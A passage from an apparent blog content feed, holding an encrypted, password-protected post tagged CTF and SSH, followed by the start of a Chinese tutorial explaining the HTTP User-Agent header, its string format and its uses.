ee1807208139a6b8d905c00fd799304cb71286e3a59d0b4c74c30bbef32f73d579fe150f0cac44d0dcfd2ef61ed02235bd8f85e41e78eae5aae0c865e1c419eec2aa556f13d26c46fd45b986d760f3024eee00c622b71a9e63a74f305eacb9306d395ea3e4d3bdd6cc453bbe19f4f3780d1785dd884dc5b25b63e1b8e0013da66078f48b67dbceedec8b2f6d05a04569ebb068d6a0aeef5c3b70f88fe536e8d2e8dbcd05fa6344088e2e9af7c0d261f8b1dfd1abdf1ab4c5dd96f99e2a36ec45a6ae97d93c56cb7a44c262866df6d23d8c8529a9c142cc41ac5f3ed28acd150576b520c5e5a6b223ebca75987738f29f91cbb649005cab1599646e48555668c0452b31add68061e04bdab9f68f682e30bf07c81158cb471e713cb87476f237d1305df1091225a05dca8af3d7dceecee238885597845ce303fc20b2375b77496509f76c486640ee436761b31bcfc982eb3be622e19d16eacf9517b53c8f191f851be95035fc51ed61aa29f26e2e40d25615ca2060d84f06e32a4f5b7a39df7c5b7e65b707937e29be05315cbbf6cd95356a1a68beedf4a6f9b2fa442fb3f966ba94f255004effec5b0a5f3eb8ee5170c89e4088128a651f4233e615ec966028ee87d5a298eca4c6bc9b3d59286a790d1834394c95498da2fc578dae18a8a23bab2e0fddf46329b0b1ce49eb57b8089ef2be67493cefc6e289844119188c20d1e55af7969c941aced93641c47a08c9847c37676071939ed15c1749dfad96658379b5121619c8a0933670df24d4766614128635b65d3f59e325e79ac35a8a4958d061f7ef0b0d6df3ae670be3383de0f77bca093a6057851e8c48486a835d68d3e75315e4c2cdca25f2d3463c33fdbf6cac896e9a387692e34919dc67359618afe91318af83774e85b035b628532e7e47160b2f25345209e5f1980d0a2973a94e2c5c9f065a2d21184663aecb5234bd6ac26761d92f3e83ef9d602a81be3b192010379da718a32267475cac01c8133eec2df994b2b374e0d26fcd35b4071ebcf27d1c175190d76c5970b1a28b55f665cf8e163b274484f4f3915c2d751a00265ccb0aa3569ba648738d895450d9f6525ccecd79bd23cb28c6c3030b4ff8b181e2cab2c8b4a16ddaf874ddc94891fbdf04d469b7e3aa2535609edee890f265cdea1c943761820418528fbf06e925f7979240b9dd9ad3ac305d71b2cfc7d50a08107adbddadc9068d3a2809b130e292983942bb64c559866984b3ec67d138aa93557db53ff6e06c656d52639b1873610d26b10723bc09c948352e901c6f6e57caab212997df780adb581b0f00dc370780442bae94432438ad8217cc825a463892119d24195694c2ff74ef1ad6f9e0a029efaa708324197768fab77e4f008a476cf3419ed5fb711755b5fd67924074202ea9ae775943fd5d83d97da24a3c075efce04c44fe18fa548d3a7036b14b5f497a4cae4cad149a1647f578e97f1651b06d68d61559dfee4aeef0f4322767155bf6f7df823e9c4b89293c18dce8e7b31886b17a8950d8b9fceb270a2b20329fc32de3f6991bd8f07ff02d6e231f6ad8cfde01e107d92bc5d79e530c31b239e0e908eede422bd932fcd2edd45b3a0b34ca8e70730da4932645c838d1f4981b989ec64e8d62279fd364d21c977bb6abb92aa40aaf38db7fd42f60b2940a59d2052cc0b4118bade762cb5f9f51038f19c3cfb013d3882beb8f18113ce3f7a6470cff9b3c6d2a8bd1aec4127c216376d73767d1adfbb46b453901d4551a9f21b1b3bd679df7842538f36d46dfe7b06756b510bcf6206f895aaa61fc91ae407babdc6ba8de888a2b8e17697ac26a261c69c40a4fed8c8aa779be0570a49cb68190060b1ceb60ea8c8e971fb2b20768c3951fb80be1c6900f389a5aa03425bd2af458b9c85b8ad9e0984eae8ce17dbe27b1328d20b627208aed2910c2243d87b9c200b8da0f5dcf49bdc8568e9a13ccb703d4fe9ca80466dec04a94029c0abf4edafc1948644f8f7b7ff5fbe4ab35fd0d71e9b8c62e7623f255e283cbb27fc56943eea129222df9a666fde3dc5b41d76dd71c3aaa7f540799cfd4e1304f611bd1b179aaf1b71af85c92de7994f7ca102690e9631b030b3b9faa17c241cd65f4b0dae581ddb04adb1c6ffe7b33375596baf9f0f9e7fea86d9887cbee7c637e0dd88ada38becb7aa3f604670369031aad99ccb54a478e938f7985b26ec48c62689e83c494b4e46fa964eb09ff94f6c16a3af41992ec008964d259da7d1bef188c3f3f630a5311612a0d097d1f36b89d98b2d5df0f5a0defb1506bef386b74eb50dbba9bc60fdc1bbc6efa1e0e6f7f2d2cb1b4231a3c49ecb86d1011fe96f8fbb0c3465fdf5eaf558f3c0ca6eeb005a6b80715a60a81d72eed477057e251284b7aa12d94f74caece9b2459a64d47ccca352f106b066c5284f8edda68dfa71ec1a6e7d3fb95eac2db79966b51e79c086a23f97b1dba08ee63c74d44c6cce7fbb958989d13538c89eabc565c654dccf827b491dad92302b7b3b4df572f45a8924e73740a7d6cc3e3120dd8f88feee0a1bd1f87d75e605f06c7fb57cb5fb66142bd8bb1d5d1fc6714ffe7213ea94da265838113c303e326835f1af4d808bfa586de94c8a53cd679e3ada0ed70a5cd9728657b28720acb27ebe854b4c2bdc591fbd0dad4e184952bc7af2ee6a3f61465a1d7175a6569dedb01e043a53ff2ab781641a29b1117d4abaf7a8a0b6c390e5cc182921ac017030939585f9389185cf653cb8086bacdbd97cc15b23e17c4d5379f6b3125ad02a07879580e38efeb1fd645a512f56fc0aba778bbed3a748d81b0734d25a3af3453f93fd6d0badd3d010ec2bef2245376f9e9137bbd671e2077a976574fac2c22029c81f1daaede4f6a9897a93dbdcc43a9514ca8db8e3fc43af7105b64de2bcbe52c18feb713c244ef6ecb761ec2073915531594cfedc7d9d81be5ddf1b11af496d42dd95eef76caeb8355c4f925246bcd2e8347c4533b049e3984a62323b39a178f38c4ca56dd9079f962e16600f783f0cb644382ea39d87020bfd4e42506db14dcd6488b1f027e196593f71efd55be9fe85855b6b18fd13e1bfca3c8b6d7e4694ba678f94f0e3ac7e7b3d455b3050df7e84d6df79e293f411320462a9e7e232b23d266bbd2a9547d86090653969dbb6f55c06a254de7f0852830bbc1a34cd7fe789d07a4c8639013943272946d9a6dd7656f2001dd1be0928a03a65e5935d1092564e45bc64bb63bf581d870c6e672a4f057f728a03a424cb832bd108e833440ed9969ce9b80069f0749007bd2df3f4c2e0ba5ca7d8d44f143f0e03610223324d60f798fa47bb0449b7e95d4d1e4f35aa7315be6431feef4523372eed4f651343125cb2db88416783acac508d2255d0c418832048c18555daceaec29743326be2a37b83c5e8586eac88eee96ba71b0089ef9c391f88456269a43fa85da3043ff41c7ff421936904818fcff3df064c2351a22cdbd1c7fb9ae9c3c0c31f15aa2d611064275ae1601f3057c75f1e4638d41f12a1a89814dc320c7009784f2aaffbab569bd20c8bcd4b30d2399755fdc6b2fdf0d6881c8bf1036a4802783fdcbee964bdb380f14295312064bd4a3b33ae778d251786ed229b12f83b5a792946f9fde6abcbb5b2739ad16c783744589a49e7a24cb6f72f14eee2c56199574427c2fed06001d11baf17606be24df016a4340472c0fc7691e9b4e904279dadc640e078234ef4ce8e99d366319bd6caefc214f7a90c4eaeccea7fbac5fdaf60f4f654b341c0d6e72cd99025ee5f0080bc5001bf278a4361d78ee00549366030fe388a68d2704b35f24e12a65691d9deb1bb1e505bb25973f2cc0cd97e525aac9e74a5e7ad63929cf57b98b5edbef155d46ae1e21438cb074ad50819158cd852dfc85e486f69981a49bc01cc9abffa3fd6c32425248835ba92ecc7634d9fd0303ce919bf669ba9d043285aa4bd37c62976e8d081ef30ce70f4b807de270fd7277425ee854e6c0b73687f7b912cc67fdefddbb231e049004b88ef5f054c09f0744109f68c161ea22f14d27462cb4eaa2c1fec8374567eb5c48962523b41e2ac727fd1efe3a6d66e7ba59fb17db57352ff435338f3a9c050295cdddb4699966f58d90872d1c3b7e3c669b9f3f792d74fe9141e18fc3a6b6ed70332d282d0c18030094b8a32b9338d070664649653754beaada36c6434039ef859c4b709661b35afe83d55b339ec2b49c77a69abdd6ad153812af323eb43c6b4e322a85dca1c6de2f6c65411786ac6e5aa15fca311a0fd2b785fdd46724492a4997f19c6acf4eebfc226ece7d5b84822e34b5814aa1e4bef97ecf082aa8940681492f4b8ea19b6e731ba1b8e71b6830af75dc283636434a2e5b288fc707a27c51fdf15e6d6efffb96f458f434a0e1387035853a445db5262fa6df0acd26972db965d1ea71adffa858009b1070069a6735bbf8385078f3a00ff5c8f8f73130434d8ede87b7fa1624997b7e9df920b554d68a4096208b90c142fb61b48ceea19291e957d7db87c9826bed962ce17ebd2c6fa8eb48403ca49e6f620ef53600a1a97edc4b59892bc0a5298457a9bafaf4c2ab6da400b12c559715731e16b2292e4470f9d6c31bad3326796b557cf8e8dc44a02b3a74366552cd05b186265a473500186eab61da852d0b520bd91ce6b1c621c2b334cfd67c7c87c3d95d92e7fc3e04dd208778997463f9a7184c07f77b1741c5d1f61d31230a800fdf0ef33020e22b2bfc8c6ea9e602bf29a111fd6dcd4248768167dbcb090183c1b19d8ac9e9295a896fdef99d713b895205d8460f085f78a968c174425a167b2facdeb8e0ade01307f27ca655cfa3f69207d1e981dd346bd7f17ecad10ce8b3e805022dcd2a6261b45e1cd3350c08cbc9ecacf6644c01d5ae774155b62347ecf61a5550ff6f6f1f12f1d70d5e68dc33bb017cac05ad2514ded125bb1782765340031a5cc5ab2b05eb53349034467e01438a05708cd1f096b491411ea0ebb596e61bd63809d7f66c47276a07f11777ca728957d56bdc9e1d65ae59746b39def050ece01df9446312ae6d5c670035afa2ca7f96220d2b58f8c9e31a9fc5e3b821ed7017f700fc71a6c9c67f5ff4d8894061f39561be49b2218126b4cae0000e9f860e2219ece9b1a3b9b7c481ad7158795724076f33a68ac0dbf20c05e49f00e30a70a047fd3363ebed6832cd8a1c9dcfacbcdc67589027f7c1a294e772637405615636666af093889752c13827b3c24dac7994887e83761d883f5e06a96d2f637525d0aa44c0f48d7a6ea8ec34f7a2526fef3ba9d57a6771404a6b39e5eaa4d298df4d07a31ea724a799dd8d4b6f3332b34434caab5713f39889fdd383f151d4bdbe2a202e63d03988108ca79dd6ab36b91a025934d36c6dee0e0baf7dde520823034ffba603b9fe0c26c64b4de4899f231230de7a27b3303e61ec4994b263000da7c5417760395c75fd491c4d93bbb1de6bb030d0f931ff66c3f5592dad9c50e7744b5ef799430ff065f1563ec702e9ea55189aca53492a2fe6a1a292074ff761ccc2f8cbd7eeaba62c3084533bd63863ffcd64bf93fe01751c93a11d17ceab2769e051cc4211e3b9d5b0ec7138619b8bbcf7f447a5a009f8e43c7973837a4cbf40df2dcfeff34d4a926db8f930920b8ac14ac7bac258208516762ac49cbb0fe0b123d5de41f91aff1928ea82391edfcbf965832ae180b1968e3043214eb0a1a8d8f814c41501e31b63de631b1ea3ae4eaced5ffd61cf64361806d19b555ee51d8d12090813b2aa5e1883931637a00d3e59ab4ad9edb5baa4b1f2f532d5ff82aee8215b91dd345778a69e41b5f7cda62b61ccedd56d8d68d2be6a6c48c414432f6e30fd11d5fbbfcb8a5d97833602a31892b5cf6c9291597bc3fb5fbae0396b3665d018f7d848b2fee95c3dd03f218543bf3f2e8265f27e7dbcf1d97be159a3ce8355d63928baa38fffc4998511b2ebcf5728dd5219383a97da250d1be3973006fb12383c85f81567a0b36605c57dd9c4c01f3d2bceba346f81863615a64714f28eb08e52cbdeda38303d4f339315658e7b50519a2c02aaa228b3f053f9f869efafd656841fa33fd6aa11d23b4d64bd76178f3d9332883cb73e6906c770abd6c792f724c672a37cd9c27543cdb5fc45a2e849ecfa1fe086443aa37b341bfd30bef32a344aee133a55ebd18656fa53e739dc7410219910817151929f2a08ba56c0629e519111652ed319f008e0663387671abb5d48faebc6b262e2b859daaf91e0e9f708de5a46350fe300535d2266d36ed251b0f7e6989f3de04650e8223d7690b4b416c991e1d354002523f7d64ee634829a4e96baa5ab0e676dea996867517b6e3e0fe6dc287f1b4af9c498d196c5554a776e7deb99761ac1ebd405ecd88e2ff4f4284d83b634a9c983f2072317532eb36d9c102ec94ae8e25a82fe098682b8721e743941608f44563b7b18aebf7e94e284edb0b201ff95a6c2ef6dc6ca84d75ac5370e15e791bf75da42a62a91468df959fb6f5b0c680cdd4707e51666433059bfb02917008e639701a7cd6593b221b5f5bb1c6a7baa135133c3d9f8e8b95856e0755d0ff55e4d47b1c8a3f087f793db04176bee53790f66ee77a40a1f4413ccdf84fe1de4bc3af8512c288fc16a47d22a58ff4da6c655caa84294e0cb0cdce701ff7851fc2d781462fa136404c08ec0cc7a1fcc2078da24df4aa92cf9309e48063f0fcff8af554d6d949f85ed3e1084bf926fc3c19c4e2f4199800446cea9e9f678d66c90353f3fe22df5045c490d28cb6de4a055c75c7f78dcb6978e9606511cc7418196c38552950ac47a9e6fdabb7b37c0f241709718bcdc1e8567b64829c1a34ab8b328cef839b7650c6e2c90026b8b4c20e8660facd7a20fc7dca800db77192ec85d57e227e62a63db9db917521c989a8aa96b5492e261fb96ed1bf3e82acc9beb291152a037f697ab5c0b27518c55f0aa28ea73dc3c05d3438d3f67d3f302fa85a4a4cb46ef8a3ede6418fa33a2ae0ad03239acfd32f360c592fac4c29909237b7845936a8485b417e7f9ca5ee91ec6874563248f031c1088e34ea32fc75f2fa83ef5c914f3bb406b752d2ba0ab44ea6682068e0d90e0d2e1dc012dd7c63d4a7d6da1bd799ab7d35d29fe407e0144a141ce153a84e2df6222ede8c8edc9c4f1f67d7f87c2268d20d60d37fd480427f247ca123e5ca002ff544693b9b95639d3080ed1b45264f4a79529dcd347a97584b1553b8d7ff7bded01267e8149359640141951eb3e9e7ec95b452cfdd6f4072389a488d77a214bf0701c0a59bbd65bf85d0ddcbde35dcbc45a60ce6d99db9f59110dae98e4c2baf5e391a9f9d56ef8fd2915daafaf607a332297947f4316cae9100814b4f950f1c78ed1999fc7aed87a54a515e9bb67b2905ebb870a71a3e2cec0eb5ddc0e3edcad728f102ce4b0edd7805a6f63029110277eed2ff9125125ad8caad5e7ab32d84f86f4a7e3f0a1ef6518326da861b5336c38d40f630a42c45ea4d65bf4f0dd873f515203c46f6be9a93790d6a9510cf04c86ebb8417d93a857cfc63cdc3ef31f1517a2c590187e8168f85a734dad294034d4deefdb6139183246311bb0f2ec372178d94704b38c290f57f34600f0ec70ff7f6c9b0f428f19254c503a400869e5392cf42cc31f0b392d25816908da3f78487e3f3840e0ce8968a77ee692a1fc091e5b5d9330a99e5cd337ad79c46bf741c23123f1f2f45e7fc8264c6665b0f5e51def3f1f8fd06ad68b821c4c90675b5208b96539b95ae6e36d7e495cce11e1fdd14ec88d1ff6425cce4d2cb30142b6fcf4e4eded1222dc3408a95d9836479910ea672cb442e00c9ed10477bf0279b10c4028f440e5bf641906cfbfa38d933f2afa1d97150aa61a2225a90bf56430dcd7bf447a22ce59119613bf087d383ea97e3eeb3b7244eb6e87945b8d73c803dcbae14cef25b6de7244f7f13d053cbcdb36bd8ec973a7ca7664fb319fb5365d134655788d7dc5b8e4991291e4f52b6d23ae961b4493d4be4a61c35b7dc7631094047dd26b487f37f15e653b12cf2f7f750743b5ac75ca29f2e5d5d9bff585c924eb308163dfb433582afb58bb4393550557ae859befc0d7d1ac487ae840a5686adeba9ee2efa807f8470e93ea1872f1afe9bf432ba9861a103d0802a05d60af44b2aaee415a9fc3e1fc275407b6f2309d2993a06a559f9e39b2d83bdcc43d66dd4b6be22ffe34c530d48d578a729f94378407b01551da6624f160cf6f29d1cdff99f1de316db8de53a781704379393ffce0c6dd95eee52150d650ec698bcfd7d06ff48e967358dfc2441c7c737f0657402dc23db85b456f1834cb794aecda50ded00b14590823e6890712be6e22d5797cf36790aac87515ff85828e87fcce68d8a9ff2fad6abec29de60a76cb40ad978fa551b683dcec4c2709ee822c8a5d6253e624ad30707c3624e565083f714c84387a79118bf61de19e6693506dbcb5c1aef9f08c5114f5365a3f79fe2bf471a486dd3f027c4e4032c895fb2d194c6b1bd3c791831a55148646ef439817a20c84dff1fcb484d871bd3c0717761a2afc4abedce4680bf8799083a6e10dba070b2d29927e96411eba9c4f64949d0dc1395c5f20e33a2b2b66e78df26ab88156cb2d51df23bad510ddf8fb29f03175116997296eb3f9ca4d5e8dd4725bc6aaf0b4166b7d1b5622e406df8fea42a3ad08d1147d2fa401a7099ea1cabbfed1f572b72a9d03b4971d328f6d78b525a9993d05e6f7e61dbecc10253baac8650cd7ea1212218d4b8228710f9330dc3da649cdc85b86597664015e80f806708dced5c57727f43ac27357449f929b693d9a65026b9ffb9805e66102404833f1c0b0fd2a4b6d8f6e699a55a7c1c6fd14e4462564dbaa0bfdf854114c5561154c3e41386796c2174e431e11de3eeb95345c9f79d64799a33d55e504c6333d0316e06f511d6ce710d96c18711157fb9d44744068ba62108eed930a7a5a0918f5941b9223ca0a3f383ffb17558ff9973ac110cfae40f3ceff9b145db7efb1e992a741f117c8512ceb264b5bc046908ea3b74c7c5492543c90e7698efc01b9bfdb3afae10b82fbc0ae1a6dd4303acf5a767c140041c650630467ffae989999840aa471232d331876888f72b1c74eb1791b1e278b180103e28de70e327fc0a2fc0c33a13b1af138dda54a8f322b73efc4bc1819507d00883b6db5f4f257d6b834fdb1cc1e65a05f2dcfc37a83c0e9ebbd5ae66f5fb4d72776eda4485ff8eac86d3c0cb57a3c25c72d4616f9ccea62a29e35519edff7c49633142ef6ebf073e392e9bf1e2419d0125b814ebac294a3bfe4fe1fbacc71edcdccda4e23703a1dadc5d94fa4687dfaf6add317b601fd9510c9dd84b4971c13570856d9f88f8a313acd9817917a3b47ad1ee5def6144612550a7b1d6e48b880a269aec7e803e0e0c51d5d999e7ec224cd7aee64323850bee654c36391954d14099a21d10420d12cd5940db025891c59c1c3e83e34c67890e7f971838fea8a5354636824c66d7dcc149195652e9e5e5bc12dc178607bd8b28d0ca79493bf8250fddd68500858280e2f360dae7f5cb6b3bfad39ebb5e33243430aad2e73987a4246f6b1e360621035b73b38f3a4fcc7ee582c430a6856d07523e7df2ecb28d8823a9b042228e8ab9f2c5ac475bf551573f9aa2a6e664137108cc5b3841e8bf6dd5c1e0d1b5f401bf9191bb423815daf5779125de2d5712642c209d783b9df1eb02ef87e189a9b800afba6844331c50b845ce27956d788c6021fabc08cb204282f78ec397f8fba4bd10bb5fda929f3ec32e1702ca7b643bf997be187b10435e5d9a04fb8fb5ce6a97b6ae4594169461653a482a38979dcd804d75cf4988ce125eb4f46a3d3a245d79c564a5ea183b86640aa6c54db290892e202c12dd67a46de8115093368e72f8b07a684bb1e894a79558952cc036b71751ba6475772751e2a7a13110a7f47a62b128cc900075c285ab549d97fb8f26880f6fe52e838fff35f77a3e83a9f49a63a2f7cc2fcb996678690017683b8e7993514927268528c2897dd292f5de46fcaeb33b08b7efccb137ecdfdd0752b4bc4fe44cb84e4d924f471147870f45cf5510c9dc139dde34678ef5e5670dabe4fa8f3ae5d9de9ff3ae3f5ce84c29b151776b9039757423059a4c6741803e2c3b110f49f09b3880cc7ca77c635487dd37466fdbe209cf69a6212a41f8fc426dd0e4063587579d2d4541c1496793908bb263bfc681f5e6c16dcb25689d3d0bc561750092d485194019d14a37c44e1e5f71be9c4deb4814736327cbde20cc15366a64a1535e61321b856d4205c7cca5ee573e9981ab75776b08d927542e6583c249c74dcb9354894d852d558c0d78f6554e6ca5145232d3cb45661488381846fb563b9a9f9e174c6031a0fea20b1e2024b0341417d286d2386a1ba44e2f201e4e027421cdf4162ca86b94aeabb9358809fd16ee8f13bd462371f15a49654e09087d36ce3cff2db9e7ed69f5297b328ba2d91c1811dab608b5166762e2d545ae9ece513320353e7654fed9acb06b390debdc23d51aceadfc85575a05d3690d9476c4dc163e14e2a0b716645025f3b6e6434cfe87697243c10b44ce1d3aa51fe6b036b6937f8f60005dd17985f505beb0a6c0005987dc716cd1511bf7e6df1d994c6f663df37fc0682dc660ef3c63b20e224410fa11e413f627b9f828d33bfeaca97cf36a8ea63be2a3da3eced7082024ef06955297ffb31639a279d8138fba96ecd1cd7958af43d2cf71ca7980f950ad84f4e98fd1132467af6ea2a5212144a905a32b0f8ad2c2f3531bfe1d7c38d24c595cedc25c620fd34c8206be7e018898769b09b1281f71d56df4d6bd2074aa40262c520455a4497ba50e1463d96bc131217ac800f24649dd27b1b181ea7752026c2d53a8a820c2d50c1285c757dd313edcd6644ba65bbd9d7a9b2675771102f7c22edc752649576110392d8bda8edd41c1989a9717f2b18812a39a3dcacdfc3e061cb9892acd30a7a097e9ab9d329887a311d38c980689595e45568151f8d5e13b96ade3977d84f130c0e742e823102c3c0f42d60a8b3ad6383788c70e8f5dfcd3ee33b5260d347d49ca879328fa2d54890ddde88bdf0e05214406f650d9b481fde737920e1a50f67d4de4ee2629bbdce2dc43e54ef82d72b908bad828b498ea155e10f0e5d2bccc5fd7bd631b323fae491082a08eae04a0435d142e3e0febabf8351d8dd478cf2018aa477623b410360391939c0c032dae7035124544b3fbc7d68f4f11639397739bd89c4ea22d104a78c15e2b854f91a3ef684fe3fc21ee3583e25a2ded98d8dbe314a6bfd5d4cb423efe29fe4aaddb57b8328d5e08e457db7b0526e455aa19ccd650073c0b3db4f8f03ec7f57f6d16f0fa9ebf53e05a98bd03029fc9fe9c4ccd1c3a5b3291418b51c3f19e9e635f541eb205686c52342570bafc4b58e0d3ba65422f2f2538cd9430d9608b2454d2a681d0fc1c9ad29e6d8090ca0eddb5ba190442c48f0a96ca9d47cd2745d7eab7df23c420c8b8f0e01766b78a8f0f1e7dcda70affcbcc02ab8f77543c5689cabbb05d0d3c1fa3c76fdedc87fec7491e592f9bf601f82b02feb38a293fad58b1048eab073fffeb4aae0ad7a7373e27187cc75785c04938a0f93342e3fbb248ba1512cb1658502b27d5a25f0c9d4089b99b0640b62c81b891ad86712308415b2087660aa2f0fb40ba075a9e8f57dffe5b0bfa7b8346c8713d9b6aebbd8b39074f0ab8029b93d5db1e10eb41b3a338ff9b28facdf04cc0cab511c1236a3adf33aa92c8b8867b752676f7effd4da0740dd7df7f88cebb6016c68a0e2a622644f5eb79a5fe493d11a247ce99e525114e50a61494e69860f3ed5eca1c24fbc569d0485ccdb6cf054acac43305aa0c92703cf964ea4337086e54b8f35c11ff2034cefb462a862c262f98a4a6e962359dbf4408eabd7cd4ea857d8debface3026afe16e46a4e8050a4a5e96a5f7ca115f39762c0d358f8be1ddf18fbdf9b6bb6a36fcc90ce580db875c02658e5e6b237c6eb1eb2f967ae0118e1318f3b2d290174818d0f7fe0e544f01139efda3f0f5107caaf204fd3cdced22b6eb04668520d0ef6c663eca0f0db7649da94c7f18246bf7dd5bfe8c82c92a6a62ca33f5cdc3fd1695a632d81a26f5c3c2af4928b69e72ba5eb64374bebf489b27c7e3e5d9dcf2c63d1eccbeea6b194f36896ac0245725b4f7de511f0a9f43241974e709deae6218fddbcb6b4198e9b40aa94b0ae36d37f0428b58255dac437660d03795fbfdacaa14e5a8301e98835f77c99c1e4dafa53d306b6f31063b247f3aa73af22a352c9c04d3328088a8a7869e0c6de253f447b773ce925036f453e4d9158b72c043ea678ce308fd7c82aa7ec16c089e411952cea8ca99ebb5d5a2b47decf5b323d3640d32f79a4f27eb2d1e090f3c9319d10bdb73d36af658d8ec6b275fb13694631ff40ba30506420a61e6a7535bf89102d16a34790015b8293cb5f7f880d8bca52abd0a0f0b393be5a76b165215298e14017a1e28e0a59afc0f74d6c6a7f9a533a1e2d6bc08010205de71a85080479bdb4da0e584b4703fd656f8cd7dd9b7186cc662afdea7c26d1360a2f0840ad98a38c17a0eff0644419d8c279ab7ecb0bc2097f02ada737a363a506cbd2168e93323392e27281010658518aca2d467f3691e46a94eb671ec7b5ae745d9bc57c1215f1329c0ade84fc47815e293b73e9dcc32fea597149a962cd4acf6178ef95b4c6348cbda6a47d84dfc7746bf0bd955613c472ba006daab3ede45e31e9a8e9e9b61274e43829afff874f76c94412154a70e3213d9308e9be16d9a3888698a2ac337ffe33f5fd44ea4a30ab278ff86e5f183a1fe672eacaf6a3debdda224c1d7045b768c69ae0d72e812e047a528b3eb9f4f7a01f08187a72d6629b45057b730ecc6fc7782388a724b8ea2c6547811fa089415350e8f014507b2049c508a1cc51a773a8dd97dbab2a094e95eef3ece8adf76d39932cdae8dd757244ee41242a1f60cdd2cc0ad5cf3117fe61f379e94fd8aac22e3fecad1a661cd5a4735bee26b6b12208ae4ff0bbd403bb009c0d4f5d9400fb2caf02208d2e540a0226c709cca76f8a223f630d1b2e43997e9499816c8dd88c513a3a0cf4198408e96d606987a4a1e21b95762a6823a249e58bf99af3cfc48a944e9c3a0ff0682d0f761e6dd1325606c099bc0a969aed75da9fd396122dbbdc67a7c74a0a0c25ba387e6f9f7034cf0d06de03e3a3dd43f1678844f1f9af9704836c9a8e73672cc096f87c5407857f798a75e66e4c7b3330633d620669f04f99b98b7730aa8096cdb046de00cbfcfb64e433701e8e43b7ee145936e0933e08d2b7bdf56262cef4eda2cdab15c583d5cc67e38ba1678aa65abd5fedbb53d550592511a3a3a786fe398229403e4d0cf77b3d11c5fce690c90092b1515a221cd97e58a08b8933e5a0ee8baba51fbe4c6b62ad797e1431ad2a36f9e2f01c36ad05f31f241de6177192793c7297b0a336ce59132056d7c262b2c32939bf4f20b11d9060ee16fb6bcf986b2dd8a309b859326c9225fc771ac0e47e08b137966cf1e8f7f8686a0044ec8c1a8a822</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>《HTTP协议请求头部的User-Agen和Cookie》</title>
    <url>/post/HTTP-User-Agen-Cookie/</url>
    <content><![CDATA[<p>&amp;ensp;</p>
<h4 id="一、User-Agen"><a href="#一、User-Agen" class="headerlink" title="一、User-Agen"></a><font color="red" >一、User-Agen</font></h4><p><strong>注意在HTTP头部参数的首字母大写格式！</strong></p>
<h5 id="🌸1-1-什么是User-Agen"><a href="#🌸1-1-什么是User-Agen" class="headerlink" title="🌸1.1 什么是User-Agen"></a>🌸<font color="red" face="楷体">1.1 什么是User-Agen</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.1**、</font> Http Header之User-Agen的User-Agen中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。<font color="red">浏览器的UA字串的标准格式：浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言)渲染引擎标识版本信息</font>。但各个浏览器有所不同。</font></td></tr></table><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.2**、</font>用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器！User-Agen也是用户识别的重要部分，通过分析，能知道用户使用的是什么设备、什么浏览器、什么应用等，进而可以分析其购买力、属性、职业等。</font></td></tr></table>


<p>&amp;ensp;</p>
<h5 id="🌸1-2-对UA字串的说明"><a href="#🌸1-2-对UA字串的说明" class="headerlink" title="🌸1.2 对UA字串的说明"></a><font color="red" face="楷体">🌸1.2 对UA字串的说明</font></h5><p><font face="楷体"><font color="#008B45"><strong>1.2.1</strong> </font><br><font face="仿体">&amp;emsp;出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在 UA 字串尾部可以找到。</font></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.2</strong> <strong>操作系统标识</strong></font><br><img data-src="https://s1.ax1x.com/2018/12/18/FBlnde.jpg" alt="FBlnde.jpg"></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.3</strong> <strong>加密等级标识</strong></font><br>&amp;emsp;N: 表示无安全加密<br>&amp;emsp;I: 表示弱安全加密<br>&amp;emsp;U: 表示强安全加密</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.4</strong> <strong>浏览器语言</strong></font><br>&amp;emsp;在首选项 &gt; 常规 &gt; 语言中指定的语言</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.5</strong> <strong>渲染引擎</strong></font><br>&amp;emsp;显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎&#x2F;版本信息</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.6</strong> <strong>版本信息</strong></font><br>&amp;emsp;显示浏览器的真实版本信息，格式为：浏览器&#x2F;版本信息<br>注：<br>1、在广告定向设定中，浏览器定向和操作系统定向均是针对User-Agent中的信息进行定向。<br>2、欲了解更多的User-Agent信息，请参考User-Agen 字串史</font></p>
<hr>
<hr>
<p>&amp;ensp;</p>
<h5 id="🌸1-3-User-Agen的作用"><a href="#🌸1-3-User-Agen的作用" class="headerlink" title="🌸1.3 User-Agen的作用"></a><font color="red" >🌸1.3 User-Agen的作用</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体">通过user-agent不能完全准确的判断是属于那款浏览器。由于UA字符串在每次浏览器HTTP 请求时发送到服务器，所以服务器就可以根据它来做好多事。
比如：
1、统计用户浏览器使用情况。有些浏览器说被多少人使用了，实际上就可以通过判断每个IP的UA来确定这个IP是用什么浏览器访问的，以得到使用量的数据。
